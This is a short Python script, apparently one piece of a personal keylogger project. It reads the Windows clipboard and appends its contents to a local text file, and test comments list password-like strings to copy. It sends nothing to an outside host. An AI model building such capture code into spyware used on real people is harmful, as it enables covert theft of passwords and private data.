# win32clipboard allows for the opening and capturing of clipboard data
import win32clipboard

file_path = "C:\\Users\\Bryce\\PycharmProjects\\Project 4 - Keylogger\\Pieces\\Clipboard"
extend = "\\"
file_merge = file_path + extend

clipboard_information = "clipboard.txt"

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("\nClipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not copied")

copy_clipboard()

# Things to copy
# Password12345
# my9dfS5HGH#12
# Pineapple DOES NOT belong on pizza